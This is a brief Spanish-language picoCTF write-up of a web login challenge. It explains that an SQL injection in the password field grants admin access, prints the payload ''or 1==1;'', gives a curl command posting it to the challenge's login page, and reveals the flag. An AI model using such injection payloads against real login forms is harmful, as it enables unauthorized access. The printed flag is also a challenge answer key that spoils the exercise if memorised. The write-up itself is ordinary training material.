
### Descripción 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
### Solución
Insertamos una inyeccion sql el campo de la contraseña, ya que al validar la segunda instrucción que nos da acceso al usuario admin, la sentencia se ejecuta por el or.
	**'or 1= =1;**

Solución:**picoCTF{s0m3_SQL_fb3fe2ad}**
### Notas adicionales
	SQL injection consiste en poner una sentencia maliciosa sql mediante una entrada en la pagina web 

	En la consola es con curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=' or 1==1;&debug=1"

### Referencias 
https://www.youtube.com/watch?v=0EDbUSDqrng&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=7
